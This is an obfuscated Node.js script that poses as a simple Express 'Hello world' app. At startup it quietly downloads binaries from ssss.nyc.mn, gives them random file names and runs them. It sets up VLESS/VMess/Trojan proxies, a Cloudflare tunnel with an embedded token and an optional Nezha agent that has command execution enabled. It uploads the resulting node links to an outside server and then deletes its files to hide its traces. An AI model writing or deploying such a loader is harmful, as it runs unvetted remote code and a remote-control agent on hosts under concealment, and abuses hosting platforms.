function _0x2776(){const _0x1a354a=['/trojan-argo','90eTMTWC','\x0a\x20\x20tunnel:\x20','https://amd64.ssss.nyc.mn/agent','\x20already\x20exists','basename','&path=%2Fvless-argo%3Fed%3D2560#','12325269YKlUFh','App\x20is\x20running','express','358069wSMVyn','sd1.diuck.ggff.net','readdirSync','substring','length','CFPORT','boot.log','child_process','\x20>/dev/null\x202>&1\x20&','utf-8','2096','\x0a\x20\x20\x20\x20','set','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','win32','sub.txt','readFileSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/api/add-nodes','./tmp','1290nRURtb','vless','data','NEZHA_SERVER','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','nohup\x20','test','Empowerment\x20failed\x20for\x20','finish','.exe\x20>\x20nul\x202>&1','cca10980-52da-4df2-aaf9-eb30b682db1d','yxip.dxck.dpdns.org','forEach','arm64','Add\x20automatic\x20access\x20task\x20faild:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','block','Hello\x20World!','pkill\x20-f\x20\x22[','includes','https+local://8.8.8.8/dns-query','arm','match','Unhandled\x20error\x20in\x20startserver:','sub','trojan','message','Error\x20in\x20startserver:','SERVER_PORT','/dev/null','path','xtls-rprx-vision','PORT','trim','tls','\x20>\x20nul\x202>&1','--tls','has','freedom','Hello\x20world!','8443','33180ZiiJZA','quic','web\x20running\x20error:\x20','FILE_PATH','response','\x20-c\x20','2053','statSync','?encryption=none&security=tls&sni=','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','http','from','application/json','join','&fp=firefox&type=ws&host=','direct','get','post','del\x20/f\x20/q\x20','SUB_PATH','abcdefghijklmnopqrstuvwxyz','then','\x20>/dev/null\x202>&1','NAME','443','/vmess-argo','unshift','\x20-p\x20','https://amd64.ssss.nyc.mn/web','firefox','\x20successfully','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','?security=tls&sni=','taskkill\x20/f\x20/im\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','random','eyJhIjoiY2Y2NGQ3Mzk4ZjM4ZGM5MGExOTZjYzY1YzIyZGMzNDgiLCJ0IjoiOWVjMjEwYTUtZDA4Mi00N2Q3LWI1OGUtMzQ2YTA2NmRlYTZiIiwicyI6Ik5UbGlORE0wTURJdFpUbG1NUzAwTldSaExUa3pNR0l0Wm1ObE56Wm1NVE5sTkdGaCJ9','/tunnel.yml\x20run','CFIP','4301776OUznMy','127.0.0.1','7uGFdgZ','ARGO_AUTH','\x0a\x20\x20\x0atrojan://','env','mkdirSync','error','/sub.txt\x20saved\x20successfully','26IktsVY','Error\x20executing\x20command:\x20','log','listen','createWriteStream','Download\x20','10746zcqwDQ','UUID','Subscription\x20uploaded\x20successfully','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/bot','\x20failed:\x20','aarch64','\x20-c\x20\x22','/api/delete-nodes','util','ArgoDomain:','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','existsSync','npm\x20running\x20error:\x20','status','clear','2087','https://arm64.ssss.nyc.mn/agent','ARGO_DOMAIN:','catch','216366aJwXDo','exec','php\x20running\x20error:\x20','axios','send','tunnel.yml','text/plain;\x20charset=utf-8','fileUrl','tcp','5582184TXEZvp','PROJECT_URL','automatic\x20access\x20task\x20added\x20successfully','2083','config.json','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','push','unlink','list.txt','\x22\x20>\x20/dev/null\x202>&1','Skipping\x20adding\x20automatic\x20access\x20task','filter','base64','toString','UPLOAD_URL','floor','\x0a\x20\x20credentials-file:\x20','unlinkSync','&path=%2Ftrojan-argo%3Fed%3D2560#','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','stringify','chmod','charAt','writeFileSync','tunnel.json','/api/add-subscriptions','platform','split','/vless-argo','\x20is\x20running','none','fileName','Empowerment\x20success\x20for\x20'];_0x2776=function(){return _0x1a354a;};return _0x2776();}const _0x54dbd9=_0x3e22;(function(_0x51862d,_0x509ded){const _0x3bf09c=_0x3e22,_0x2a1fad=_0x51862d();while(!![]){try{const _0x45080c=parseInt(_0x3bf09c(0x14b))/0x1+-parseInt(_0x3bf09c(0xfd))/0x2*(parseInt(_0x3bf09c(0x117))/0x3)+parseInt(_0x3bf09c(0xf4))/0x4+-parseInt(_0x3bf09c(0x15f))/0x5*(-parseInt(_0x3bf09c(0x103))/0x6)+-parseInt(_0x3bf09c(0xf6))/0x7*(-parseInt(_0x3bf09c(0x120))/0x8)+-parseInt(_0x3bf09c(0x142))/0x9*(-parseInt(_0x3bf09c(0x188))/0xa)+-parseInt(_0x3bf09c(0x148))/0xb;if(_0x45080c===_0x509ded)break;else _0x2a1fad['push'](_0x2a1fad['shift']());}catch(_0x5cbdc6){_0x2a1fad['push'](_0x2a1fad['shift']());}}}(_0x2776,0x8ac9f));function hi(){const _0x366bae=_0x3e22;console[_0x366bae(0xff)](_0x366bae(0x170));}hi();const express=require(_0x54dbd9(0x14a)),app=express(),axios=require(_0x54dbd9(0x11a)),os=require('os'),fs=require('fs'),path=require(_0x54dbd9(0x17d)),{promisify}=require(_0x54dbd9(0x10c)),exec=promisify(require(_0x54dbd9(0x152))[_0x54dbd9(0x118)]),{execSync}=require(_0x54dbd9(0x152)),UPLOAD_URL=process['env'][_0x54dbd9(0x12e)]||'',PROJECT_URL=process[_0x54dbd9(0xf9)][_0x54dbd9(0x121)]||'',AUTO_ACCESS=process[_0x54dbd9(0xf9)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x54dbd9(0xf9)][_0x54dbd9(0x18b)]||_0x54dbd9(0x15e),SUB_PATH=process['env'][_0x54dbd9(0x19b)]||_0x54dbd9(0x177),PORT=process['env'][_0x54dbd9(0x17b)]||process['env'][_0x54dbd9(0x17f)]||0xbb8,UUID=process[_0x54dbd9(0xf9)][_0x54dbd9(0x104)]||_0x54dbd9(0x169),NEZHA_SERVER=process[_0x54dbd9(0xf9)][_0x54dbd9(0x162)]||'',NEZHA_PORT=process[_0x54dbd9(0xf9)]['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x54dbd9(0xf9)]['ARGO_DOMAIN']||_0x54dbd9(0x14c),ARGO_AUTH=process[_0x54dbd9(0xf9)][_0x54dbd9(0xf7)]||_0x54dbd9(0xf1),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x54dbd9(0xf9)][_0x54dbd9(0xf3)]||_0x54dbd9(0x16a),CFPORT=process['env'][_0x54dbd9(0x150)]||0x1bb,NAME=process[_0x54dbd9(0xf9)][_0x54dbd9(0x19f)]||'固定隧道';!fs[_0x54dbd9(0x10f)](FILE_PATH)?(fs[_0x54dbd9(0xfa)](FILE_PATH),console[_0x54dbd9(0xff)](FILE_PATH+'\x20is\x20created')):console[_0x54dbd9(0xff)](FILE_PATH+_0x54dbd9(0x145));function generateRandomName(){const _0x34fe12=_0x54dbd9,_0x56f0e1=_0x34fe12(0x19c);let _0x32145e='';for(let _0x1e1f9e=0x0;_0x1e1f9e<0x6;_0x1e1f9e++){_0x32145e+=_0x56f0e1[_0x34fe12(0x136)](Math[_0x34fe12(0x12f)](Math[_0x34fe12(0xf0)]()*_0x56f0e1[_0x34fe12(0x14f)]));}return _0x32145e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x54dbd9(0x195)](FILE_PATH,npmName),phpPath=path[_0x54dbd9(0x195)](FILE_PATH,phpName),webPath=path[_0x54dbd9(0x195)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x54dbd9(0x15a)),listPath=path[_0x54dbd9(0x195)](FILE_PATH,_0x54dbd9(0x128)),bootLogPath=path[_0x54dbd9(0x195)](FILE_PATH,_0x54dbd9(0x151)),configPath=path[_0x54dbd9(0x195)](FILE_PATH,_0x54dbd9(0x124));function deleteNodes(){const _0x1554dc=_0x54dbd9;try{if(!UPLOAD_URL)return;if(!fs[_0x1554dc(0x10f)](subPath))return;let _0x17c367;try{_0x17c367=fs[_0x1554dc(0x15b)](subPath,_0x1554dc(0x154));}catch{return null;}const _0x3c50ca=Buffer[_0x1554dc(0x193)](_0x17c367,_0x1554dc(0x12c))[_0x1554dc(0x12d)]('utf-8'),_0x1ead17=_0x3c50ca[_0x1554dc(0x13b)]('\x0a')[_0x1554dc(0x12b)](_0x50ff01=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1554dc(0x165)](_0x50ff01));if(_0x1ead17[_0x1554dc(0x14f)]===0x0)return;return axios['post'](UPLOAD_URL+_0x1554dc(0x10b),JSON[_0x1554dc(0x134)]({'nodes':_0x1ead17}),{'headers':{'Content-Type':_0x1554dc(0x194)}})[_0x1554dc(0x116)](_0xe6265c=>{return null;}),null;}catch(_0x43cf6f){return null;}}function cleanupOldFiles(){const _0x206c3a=_0x54dbd9;try{const _0x9b8b66=fs[_0x206c3a(0x14d)](FILE_PATH);_0x9b8b66[_0x206c3a(0x16b)](_0x4e3ccd=>{const _0x59d8a3=_0x206c3a,_0xd5a3c0=path[_0x59d8a3(0x195)](FILE_PATH,_0x4e3ccd);try{const _0x4d6ea8=fs[_0x59d8a3(0x18f)](_0xd5a3c0);_0x4d6ea8['isFile']()&&fs[_0x59d8a3(0x131)](_0xd5a3c0);}catch(_0x5f208f){}});}catch(_0x387314){}}app[_0x54dbd9(0x198)]('/',function(_0x570fe8,_0x2ef545){const _0x58cc6f=_0x54dbd9;_0x2ef545[_0x58cc6f(0x11b)](_0x58cc6f(0x186));});async function generateConfig(){const _0x40e5f0=_0x54dbd9,_0x512032={'log':{'access':_0x40e5f0(0x17c),'error':_0x40e5f0(0x17c),'loglevel':_0x40e5f0(0x13e)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x40e5f0(0x160),'settings':{'clients':[{'id':UUID,'flow':_0x40e5f0(0x17e)}],'decryption':_0x40e5f0(0x13e),'fallbacks':[{'dest':0xbb9},{'path':_0x40e5f0(0x13c),'dest':0xbba},{'path':_0x40e5f0(0x1a1),'dest':0xbbb},{'path':_0x40e5f0(0x141),'dest':0xbbc}]},'streamSettings':{'network':_0x40e5f0(0x11f)}},{'port':0xbb9,'listen':_0x40e5f0(0xf5),'protocol':_0x40e5f0(0x160),'settings':{'clients':[{'id':UUID}],'decryption':_0x40e5f0(0x13e)},'streamSettings':{'network':_0x40e5f0(0x11f),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x40e5f0(0x13c)}},'sniffing':{'enabled':!![],'destOverride':[_0x40e5f0(0x192),_0x40e5f0(0x181),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x40e5f0(0xf5),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x40e5f0(0x192),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x40e5f0(0xf5),'protocol':_0x40e5f0(0x178),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x40e5f0(0x13e),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x40e5f0(0x192),'tls',_0x40e5f0(0x189)],'metadataOnly':![]}}],'dns':{'servers':[_0x40e5f0(0x173)]},'outbounds':[{'protocol':_0x40e5f0(0x185),'tag':_0x40e5f0(0x197)},{'protocol':'blackhole','tag':_0x40e5f0(0x16f)}]};fs['writeFileSync'](path[_0x40e5f0(0x195)](FILE_PATH,_0x40e5f0(0x124)),JSON['stringify'](_0x512032,null,0x2));}function getSystemArchitecture(){const _0x5324bd=_0x54dbd9,_0x5347fb=os['arch']();return _0x5347fb===_0x5324bd(0x174)||_0x5347fb===_0x5324bd(0x16c)||_0x5347fb===_0x5324bd(0x109)?_0x5324bd(0x174):'amd';}function _0x3e22(_0x4a8e9e,_0x3b8737){const _0x277672=_0x2776();return _0x3e22=function(_0x3e2283,_0x31adfc){_0x3e2283=_0x3e2283-0xea;let _0x4667a0=_0x277672[_0x3e2283];return _0x4667a0;},_0x3e22(_0x4a8e9e,_0x3b8737);}function downloadFile(_0xf23209,_0x325cb9,_0x1deac3){const _0x5ac30b=_0x54dbd9,_0x2e5368=_0xf23209;!fs[_0x5ac30b(0x10f)](FILE_PATH)&&fs[_0x5ac30b(0xfa)](FILE_PATH,{'recursive':!![]});const _0x3b7404=fs[_0x5ac30b(0x101)](_0x2e5368);axios({'method':'get','url':_0x325cb9,'responseType':'stream'})[_0x5ac30b(0x19d)](_0x238c5d=>{const _0x2b7469=_0x5ac30b;_0x238c5d[_0x2b7469(0x161)]['pipe'](_0x3b7404),_0x3b7404['on'](_0x2b7469(0x167),()=>{const _0x3cfa10=_0x2b7469;_0x3b7404['close'](),console[_0x3cfa10(0xff)]('Download\x20'+path[_0x3cfa10(0x146)](_0x2e5368)+_0x3cfa10(0xeb)),_0x1deac3(null,_0x2e5368);}),_0x3b7404['on'](_0x2b7469(0xfb),_0x4c8d1a=>{const _0x52c3ed=_0x2b7469;fs[_0x52c3ed(0x127)](_0x2e5368,()=>{});const _0x4c631f=_0x52c3ed(0x102)+path[_0x52c3ed(0x146)](_0x2e5368)+'\x20failed:\x20'+_0x4c8d1a[_0x52c3ed(0x179)];console[_0x52c3ed(0xfb)](_0x4c631f),_0x1deac3(_0x4c631f);});})[_0x5ac30b(0x116)](_0x3f9c2c=>{const _0x23d45e=_0x5ac30b,_0x26b79e=_0x23d45e(0x102)+path['basename'](_0x2e5368)+_0x23d45e(0x108)+_0x3f9c2c[_0x23d45e(0x179)];console['error'](_0x26b79e),_0x1deac3(_0x26b79e);});}async function downloadFilesAndRun(){const _0x29096a=_0x54dbd9,_0x4e3a18=getSystemArchitecture(),_0x5129f7=getFilesForArchitecture(_0x4e3a18);if(_0x5129f7['length']===0x0){console[_0x29096a(0xff)](_0x29096a(0x158));return;}const _0x4edf59=_0x5129f7['map'](_0x545816=>{return new Promise((_0x4c51be,_0x4d8e71)=>{const _0x58eb2e=_0x3e22;downloadFile(_0x545816[_0x58eb2e(0x13f)],_0x545816[_0x58eb2e(0x11e)],(_0x187c27,_0x2f87df)=>{_0x187c27?_0x4d8e71(_0x187c27):_0x4c51be(_0x2f87df);});});});try{await Promise['all'](_0x4edf59);}catch(_0xd5f9e){console[_0x29096a(0xfb)]('Error\x20downloading\x20files:',_0xd5f9e);return;}function _0x1363ea(_0x4aa82e){const _0x1379bc=_0x29096a,_0x5ab24f=0x1fd;_0x4aa82e[_0x1379bc(0x16b)](_0x1834a0=>{const _0x4380bd=_0x1379bc;fs[_0x4380bd(0x10f)](_0x1834a0)&&fs[_0x4380bd(0x135)](_0x1834a0,_0x5ab24f,_0x4d3150=>{const _0x4c29ab=_0x4380bd;_0x4d3150?console[_0x4c29ab(0xfb)](_0x4c29ab(0x166)+_0x1834a0+':\x20'+_0x4d3150):console[_0x4c29ab(0xff)](_0x4c29ab(0x140)+_0x1834a0+':\x20'+_0x5ab24f['toString'](0x8));});});}const _0x1ee30b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1363ea(_0x1ee30b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3dce12=NEZHA_SERVER[_0x29096a(0x172)](':')?NEZHA_SERVER[_0x29096a(0x13b)](':')['pop']():'',_0x51f368=new Set([_0x29096a(0x1a0),_0x29096a(0x187),'2096',_0x29096a(0x113),_0x29096a(0x123),_0x29096a(0x18e)]),_0x5b9731=_0x51f368[_0x29096a(0x184)](_0x3dce12)?'true':'false',_0x346a1b='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x29096a(0xef)+_0x5b9731+_0x29096a(0x15c)+UUID;fs[_0x29096a(0x137)](path[_0x29096a(0x195)](FILE_PATH,'config.yaml'),_0x346a1b);const _0x26e187=_0x29096a(0x164)+phpPath+_0x29096a(0x10a)+FILE_PATH+_0x29096a(0xec);try{await exec(_0x26e187),console[_0x29096a(0xff)](phpName+'\x20is\x20running'),await new Promise(_0x15776c=>setTimeout(_0x15776c,0x3e8));}catch(_0x560c10){console[_0x29096a(0xfb)](_0x29096a(0x119)+_0x560c10);}}else{let _0x445b7a='';const _0x46a726=['443',_0x29096a(0x187),_0x29096a(0x155),_0x29096a(0x113),_0x29096a(0x123),'2053'];_0x46a726[_0x29096a(0x172)](NEZHA_PORT)&&(_0x445b7a=_0x29096a(0x183));const _0x2cf04d=_0x29096a(0x164)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x29096a(0x1a3)+NEZHA_KEY+'\x20'+_0x445b7a+_0x29096a(0x125);try{await exec(_0x2cf04d),console[_0x29096a(0xff)](npmName+'\x20is\x20running'),await new Promise(_0x4779a7=>setTimeout(_0x4779a7,0x3e8));}catch(_0x251574){console[_0x29096a(0xfb)](_0x29096a(0x110)+_0x251574);}}}else console[_0x29096a(0xff)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5c8b7e=_0x29096a(0x164)+webPath+_0x29096a(0x18d)+FILE_PATH+_0x29096a(0x106);try{await exec(_0x5c8b7e),console[_0x29096a(0xff)](webName+_0x29096a(0x13d)),await new Promise(_0x372afb=>setTimeout(_0x372afb,0x3e8));}catch(_0x5980fa){console['error'](_0x29096a(0x18a)+_0x5980fa);}if(fs['existsSync'](botPath)){let _0x2bc9c6;if(ARGO_AUTH[_0x29096a(0x175)](/^[A-Z0-9a-z=]{120,250}$/))_0x2bc9c6=_0x29096a(0x191)+ARGO_AUTH;else ARGO_AUTH[_0x29096a(0x175)](/TunnelSecret/)?_0x2bc9c6='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x29096a(0xf2):_0x2bc9c6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x29096a(0x16e)+ARGO_PORT;try{await exec(_0x29096a(0x164)+botPath+'\x20'+_0x2bc9c6+_0x29096a(0x153)),console[_0x29096a(0xff)](botName+_0x29096a(0x13d)),await new Promise(_0x32d153=>setTimeout(_0x32d153,0x7d0));}catch(_0x2acaba){console[_0x29096a(0xfb)](_0x29096a(0xfe)+_0x2acaba);}}await new Promise(_0x1427f3=>setTimeout(_0x1427f3,0x1388));}function getFilesForArchitecture(_0x305d8a){const _0x26b635=_0x54dbd9;let _0x5bd49b;_0x305d8a===_0x26b635(0x174)?_0x5bd49b=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x5bd49b=[{'fileName':webPath,'fileUrl':_0x26b635(0x1a4)},{'fileName':botPath,'fileUrl':_0x26b635(0x107)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2ec8e6=_0x305d8a===_0x26b635(0x174)?_0x26b635(0x114):_0x26b635(0x144);_0x5bd49b[_0x26b635(0x1a2)]({'fileName':npmPath,'fileUrl':_0x2ec8e6});}else{const _0x25c7cc=_0x305d8a===_0x26b635(0x174)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x5bd49b['unshift']({'fileName':phpPath,'fileUrl':_0x25c7cc});}}return _0x5bd49b;}function argoType(){const _0x441e40=_0x54dbd9;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x441e40(0xff)](_0x441e40(0x133));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs['writeFileSync'](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3bcf1f=_0x441e40(0x143)+ARGO_AUTH[_0x441e40(0x13b)]('\x22')[0xb]+_0x441e40(0x130)+path['join'](FILE_PATH,_0x441e40(0x138))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x441e40(0x137)](path[_0x441e40(0x195)](FILE_PATH,_0x441e40(0x11c)),_0x3bcf1f);}else console[_0x441e40(0xff)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x4e1e51=_0x54dbd9;let _0x140bdc;if(ARGO_AUTH&&ARGO_DOMAIN)_0x140bdc=ARGO_DOMAIN,console[_0x4e1e51(0xff)](_0x4e1e51(0x115),_0x140bdc),await _0x41a880(_0x140bdc);else try{const _0x417af4=fs[_0x4e1e51(0x15b)](path[_0x4e1e51(0x195)](FILE_PATH,_0x4e1e51(0x151)),_0x4e1e51(0x154)),_0x22784b=_0x417af4['split']('\x0a'),_0x5bbf1f=[];_0x22784b[_0x4e1e51(0x16b)](_0x2cacd7=>{const _0x177ca=_0x4e1e51,_0xb8b44c=_0x2cacd7[_0x177ca(0x175)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xb8b44c){const _0x44d7a8=_0xb8b44c[0x1];_0x5bbf1f['push'](_0x44d7a8);}});if(_0x5bbf1f[_0x4e1e51(0x14f)]>0x0)_0x140bdc=_0x5bbf1f[0x0],console[_0x4e1e51(0xff)](_0x4e1e51(0x10d),_0x140bdc),await _0x41a880(_0x140bdc);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x4e1e51(0x131)](path[_0x4e1e51(0x195)](FILE_PATH,_0x4e1e51(0x151)));async function _0xda39b1(){const _0x1d69b7=_0x4e1e51;try{process[_0x1d69b7(0x13a)]==='win32'?await exec(_0x1d69b7(0xee)+botName+_0x1d69b7(0x168)):await exec(_0x1d69b7(0x171)+botName[_0x1d69b7(0x136)](0x0)+']'+botName[_0x1d69b7(0x14e)](0x1)+_0x1d69b7(0x129));}catch(_0x3b6c17){}}_0xda39b1(),await new Promise(_0x4f7a4d=>setTimeout(_0x4f7a4d,0xbb8));const _0x5b60f6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5b60f6+'\x20>/dev/null\x202>&1\x20&'),console[_0x4e1e51(0xff)](botName+_0x4e1e51(0x13d)),await new Promise(_0x2a7891=>setTimeout(_0x2a7891,0xbb8)),await extractDomains();}catch(_0x49f763){console['error'](_0x4e1e51(0xfe)+_0x49f763);}}}catch(_0x360e7d){console['error']('Error\x20reading\x20boot.log:',_0x360e7d);}async function _0x41a880(_0x58d6b5){const _0xe989da=_0x4e1e51,_0x2bc150=execSync(_0xe989da(0x10e),{'encoding':_0xe989da(0x154)}),_0x1ef6a1=_0x2bc150[_0xe989da(0x180)](),_0x35fb42=NAME?NAME+'-'+_0x1ef6a1:_0x1ef6a1;return new Promise(_0x82f15b=>{setTimeout(()=>{const _0x5cac33=_0x3e22,_0x546f9b={'v':'2','ps':''+_0x35fb42,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5cac33(0x13e),'net':'ws','type':'none','host':_0x58d6b5,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x58d6b5,'alpn':'','fp':_0x5cac33(0xea)},_0x19d734='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5cac33(0x190)+_0x58d6b5+_0x5cac33(0x196)+_0x58d6b5+_0x5cac33(0x147)+_0x35fb42+'\x0a\x20\x20\x0avmess://'+Buffer[_0x5cac33(0x193)](JSON[_0x5cac33(0x134)](_0x546f9b))[_0x5cac33(0x12d)](_0x5cac33(0x12c))+_0x5cac33(0xf8)+UUID+'@'+CFIP+':'+CFPORT+_0x5cac33(0xed)+_0x58d6b5+_0x5cac33(0x196)+_0x58d6b5+_0x5cac33(0x132)+_0x35fb42+_0x5cac33(0x156);console[_0x5cac33(0xff)](Buffer[_0x5cac33(0x193)](_0x19d734)[_0x5cac33(0x12d)](_0x5cac33(0x12c))),fs['writeFileSync'](subPath,Buffer[_0x5cac33(0x193)](_0x19d734)[_0x5cac33(0x12d)](_0x5cac33(0x12c))),console['log'](FILE_PATH+_0x5cac33(0xfc)),uploadNodes(),app[_0x5cac33(0x198)]('/'+SUB_PATH,(_0x5d25fc,_0x1985fa)=>{const _0x333e75=_0x5cac33,_0x3854e9=Buffer['from'](_0x19d734)['toString'](_0x333e75(0x12c));_0x1985fa[_0x333e75(0x157)]('Content-Type',_0x333e75(0x11d)),_0x1985fa[_0x333e75(0x11b)](_0x3854e9);}),_0x82f15b(_0x19d734);},0x7d0);});}}async function uploadNodes(){const _0x1d23c9=_0x54dbd9;if(UPLOAD_URL&&PROJECT_URL){const _0x8b475c=PROJECT_URL+'/'+SUB_PATH,_0x35ffa1={'subscription':[_0x8b475c]};try{const _0x404ebb=await axios[_0x1d23c9(0x199)](UPLOAD_URL+_0x1d23c9(0x139),_0x35ffa1,{'headers':{'Content-Type':_0x1d23c9(0x194)}});return _0x404ebb&&_0x404ebb['status']===0xc8?(console['log'](_0x1d23c9(0x105)),_0x404ebb):null;}catch(_0x22740c){if(_0x22740c[_0x1d23c9(0x18c)]){if(_0x22740c['response'][_0x1d23c9(0x111)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1d23c9(0x10f)](listPath))return;const _0x31479b=fs['readFileSync'](listPath,_0x1d23c9(0x154)),_0x39f5e6=_0x31479b[_0x1d23c9(0x13b)]('\x0a')['filter'](_0x233a22=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1d23c9(0x165)](_0x233a22));if(_0x39f5e6[_0x1d23c9(0x14f)]===0x0)return;const _0x5b6d40=JSON[_0x1d23c9(0x134)]({'nodes':_0x39f5e6});try{const _0x2a5ff8=await axios[_0x1d23c9(0x199)](UPLOAD_URL+_0x1d23c9(0x15d),_0x5b6d40,{'headers':{'Content-Type':'application/json'}});return _0x2a5ff8&&_0x2a5ff8[_0x1d23c9(0x111)]===0xc8?(console[_0x1d23c9(0xff)]('Nodes\x20uploaded\x20successfully'),_0x2a5ff8):null;}catch(_0x5004ae){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2e3f01=_0x3e22,_0x34f542=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x34f542[_0x2e3f01(0x126)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x34f542[_0x2e3f01(0x126)](phpPath);process[_0x2e3f01(0x13a)]===_0x2e3f01(0x159)?exec(_0x2e3f01(0x19a)+_0x34f542['join']('\x20')+_0x2e3f01(0x182),_0x5df31d=>{const _0x1a2177=_0x2e3f01;console['clear'](),console['log'](_0x1a2177(0x149)),console['log'](_0x1a2177(0x163));}):exec('rm\x20-rf\x20'+_0x34f542['join']('\x20')+_0x2e3f01(0x19e),_0x363b3c=>{const _0x4e4846=_0x2e3f01;console[_0x4e4846(0x112)](),console[_0x4e4846(0xff)]('App\x20is\x20running'),console[_0x4e4846(0xff)](_0x4e4846(0x163));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x17d773=_0x54dbd9;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x17d773(0x12a));return;}try{const _0x15fc59=await axios[_0x17d773(0x199)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x17d773(0xff)](_0x17d773(0x122)),_0x15fc59;}catch(_0x3af617){return console[_0x17d773(0xfb)](_0x17d773(0x16d)+_0x3af617[_0x17d773(0x179)]),null;}}async function startserver(){const _0x35d5cf=_0x54dbd9;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x27d668){console[_0x35d5cf(0xfb)](_0x35d5cf(0x17a),_0x27d668);}}startserver()[_0x54dbd9(0x116)](_0x104834=>{const _0x4c4624=_0x54dbd9;console['error'](_0x4c4624(0x176),_0x104834);}),app[_0x54dbd9(0x100)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
